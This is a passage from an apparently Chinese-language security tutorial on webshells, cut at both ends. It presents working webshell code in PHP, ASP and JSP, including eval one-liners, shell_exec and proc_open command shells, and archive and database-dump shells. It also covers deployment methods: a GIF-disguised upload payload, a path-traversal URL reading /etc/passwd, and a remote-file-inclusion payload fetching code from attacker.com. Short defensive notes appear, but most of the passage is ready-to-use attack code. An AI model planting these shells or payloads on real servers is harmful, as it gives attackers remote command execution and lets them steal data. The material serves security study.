&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$line</span>, ENT_QUOTES) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>3. 使用 `shell_exec()` 函数的Webshell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$output</span>, ENT_QUOTES) . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>4. 使用 `passthru()` 函数的Webshell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>5. 使用 `proc_open()` 的高级Webshell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin 是个管道，从中读取数据</span></span><br><span class="line">        <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout 是个管道，向其中写入数据</span></span><br><span class="line">        <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr 是一个文件，写入到 tmp/error-output.txt</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>], <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$line</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></code></pre><h2 id="部署技术"><a href="#部署技术" class="headerlink" title="部署技术"></a>部署技术</h2><ol><li>文件上传漏洞<br>文件上传漏洞通常发生在应用程序未能正确验证上传文件的真实类型和内容时。<br><strong>攻击示例：</strong><br>考虑一个基本的图片上传功能，以下是一个简单的PHP代码示例，该代码存在文件上传漏洞：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File uploaded successfully!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;There was an error uploading the file, please try again!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此代码片段接受上传的文件并将其存储在服务器的“uploads”目录中。没有对文件类型或内容进行任何验证。<br><strong>攻击Payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;This is a webshell!&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者可以将此PHP代码保存为<code>shell.php.gif</code>，并上传到服务器。由于文件以“GIF”开头，一些简单的文件类型检查（如检查文件扩展名）可能会被绕过。一旦上传，攻击者可以通过访问URL <code>http://targetsite.com/uploads/shell.php.gif?cmd=whoami</code> 执行命令。</p><p><strong>深入分析：</strong><br>这种类型的漏洞表明开发者可能忽略了多层次的安全检查，例如内容白名单验证、MIME类型检查和文件内容扫描等。预防此类攻击的策略包括实施严格的文件验证逻辑、限制上传文件的类型、并使用随机生成的文件名存储上传的文件。</p><ol start="2"><li><p>服务器端包含（SSI）漏洞<br>SSI漏洞允许攻击者通过在页面中插入恶意内容来执行服务器端脚本。<br><strong>漏洞代码示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此代码片段直接从URL参数中取得文件名并包含该文件，未对输入进行过滤或验证。<br><strong>攻击Payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://targetsite.com/page.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>通过使用目录遍历攻击（即路径穿越攻击），攻击者尝试访问系统敏感文件，如<code>/etc/passwd</code>。<br><strong>深入分析：</strong><br>服务器端脚本应限制可包含的文件范围，并对输入路径进行严格的验证。避免直接将不受信任的输入用于文件操作是预防SSI漏洞的关键。</p></li><li><p>远程文件包含（RFI）<br>RFI允许攻击者远程执行恶意脚本，通常是通过在包含函数中指定外部URL。</p></li></ol><p><strong>漏洞代码示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此PHP脚本通过<code>url</code>参数直接包含远程文件，没有验证URL的合法性。<br><strong>攻击Payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://targetsite.com/page.php?url=http://attacker.com/malicious.php</span><br></pre></td></tr></table></figure><p>攻击者通过将<code>url</code>参数设置为控制的恶意PHP文件的URL，迫使服务器执行远程PHP代码。<br><strong>深入分析：</strong><br>开发者应禁用PHP配置中的<code>allow_url_include</code>选项，且应用程序不应直接将外部数据用于关键函数。确保所有包含的文件都来自受信任的源头，是预防RFI的关键策略。</p><h2 id="Webshell的类型"><a href="#Webshell的类型" class="headerlink" title="Webshell的类型"></a>Webshell的类型</h2><h3 id="1-大马（Full-Featured-Shells）"><a href="#1-大马（Full-Featured-Shells）" class="headerlink" title="1. 大马（Full-Featured Shells）"></a>1. 大马（Full-Featured Shells）</h3><p><strong>PHP 示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shell</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 文件管理逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">database_manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 数据库操作逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute_command</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$shell</span> = <span class="keyword">new</span> <span class="title class_">Shell</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$shell</span>-&gt;<span class="title function_ invoke__">execute_command</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP 示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Class Shell</span><br><span class="line">    Public Function ExecuteCommand(cmd)</span><br><span class="line">        Dim shell</span><br><span class="line">        Set shell = Server.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">        ExecuteCommand = shell.Exec(cmd).StdOut.ReadAll()</span><br><span class="line">        Set shell = Nothing</span><br><span class="line">    End Function</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Dim shell</span><br><span class="line">Set shell = New Shell</span><br><span class="line">If Request.Form(&quot;cmd&quot;) &lt;&gt; &quot;&quot; Then</span><br><span class="line">    Response.Write(shell.ExecuteCommand(Request.Form(&quot;cmd&quot;)))</span><br><span class="line">End If</span><br><span class="line">Set shell = Nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>JSP 示例：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shell</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">executeCommand</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        Process p;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p = Runtime.getRuntime().exec(command);</span><br><span class="line">            p.waitFor();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine())!= <span class="literal">null</span>) &#123;</span><br><span class="line">                output.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Shell</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell</span>();</span><br><span class="line"><span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">    out.println(shell.executeCommand(request.getParameter(<span class="string">&quot;cmd&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="2-小马（Simple-Shells）"><a href="#2-小马（Simple-Shells）" class="headerlink" title="2. 小马（Simple Shells）"></a>2. 小马（Simple Shells）</h3><p><strong>PHP 示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP 示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">If Request.QueryString(&quot;cmd&quot;) &lt;&gt; &quot;&quot; Then</span><br><span class="line">    Dim shell</span><br><span class="line">    Set shell = Server.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">    Response.Write(shell.Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.ReadAll())</span><br><span class="line">    Set shell = Nothing</span><br><span class="line">End If</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>JSP 示例：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> rt.exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> proc.getInputStream();</span><br><span class="line">    <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is);</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="3-一句话木马（One-liner-Shells）"><a href="#3-一句话木马（One-liner-Shells）" class="headerlink" title="3. 一句话木马（One-liner Shells）"></a>3. 一句话木马（One-liner Shells）</h3><p><strong>PHP 示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP 示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Execute(Request(&quot;cmd&quot;)) %&gt;</span><br></pre></td></tr></table></figure><p><strong>JSP 示例：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure><p><strong>Python 示例（用于服务器支持Python的情况）：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python版本的一句话木马相对较少见，但原理类似</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">exec</span>(request.form[<span class="string">&#x27;cmd&#x27;</span>]))</span><br></pre></td></tr></table></figure><h3 id="4-打包马（Packing-Shells）"><a href="#4-打包马（Packing-Shells）" class="headerlink" title="4. 打包马（Packing Shells）"></a>4. 打包马（Packing Shells）</h3><p><strong>PHP 示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;./my_backup.zip&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>)!==<span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;cannot open &lt;<span class="subst">$filename</span>&gt;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;path/to/directory/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加目录到zip文件</span></span><br><span class="line"><span class="variable">$files</span> = <span class="keyword">new</span> <span class="built_in">RecursiveIteratorIterator</span>(<span class="keyword">new</span> <span class="built_in">RecursiveDirectoryIterator</span>(<span class="variable">$dir</span>), <span class="title class_">RecursiveIteratorIterator</span>::<span class="variable constant_">LEAVES_ONLY</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isDir</span>()) &#123;</span><br><span class="line">        <span class="variable">$filePath</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();</span><br><span class="line">        <span class="variable">$relativePath</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filePath</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$dir</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFile</span>(<span class="variable">$filePath</span>, <span class="variable">$relativePath</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Backup created!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP 示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Dim objFSO, objFolder, objFile</span><br><span class="line">Set objFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">Set objFolder = objFSO.GetFolder(Server.MapPath(&quot;path/to/directory&quot;))</span><br><span class="line"></span><br><span class="line">For Each objFile in objFolder.Files</span><br><span class="line">    Response.Write(objFile.Name &amp; &quot;&lt;br&gt;&quot;)</span><br><span class="line">Next</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><em>注：ASP本身没有内建的压缩库支持，但可以调用外部程序或组件来实现。</em></p><p><strong>JSP 示例：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.zip.*,java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">sourceFolder</span> <span class="operator">=</span> <span class="string">&quot;/path/to/directory&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">outputZipFile</span> <span class="operator">=</span> <span class="string">&quot;output.zip&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outputZipFile);</span><br><span class="line">    <span class="type">ZipOutputStream</span> <span class="variable">zos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipOutputStream</span>(fos);</span><br><span class="line">    <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(sourceFolder);</span><br><span class="line">    File[] files = dir.listFiles();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        zos.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(file.getName()));</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="keyword">while</span> ((length = fis.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            zos.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">        zos.closeEntry();</span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line">    zos.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">    ioe.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="5-拖库马（Database-Dump-Shells）"><a href="#5-拖库马（Database-Dump-Shells）" class="headerlink" title="5. 拖库马（Database Dump Shells）"></a>5. 拖库马（Database Dump Shells）</h3><p><strong>PHP 示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 